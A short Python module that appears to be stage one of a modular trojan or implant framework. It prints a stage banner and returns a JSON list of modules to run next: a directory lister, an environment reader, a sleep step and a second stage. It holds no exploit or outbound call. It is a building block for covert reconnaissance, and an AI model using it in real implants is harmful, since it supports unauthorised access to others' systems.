
import json

def run(**args):
  print('[$] Enter stage 1')
  basic_config =json.dumps([{"module" : "dir_lister"},{"module" : "enviro"},{"module" : "sleep"},{"module" : "stage_2_qrw"}])
  return basic_config
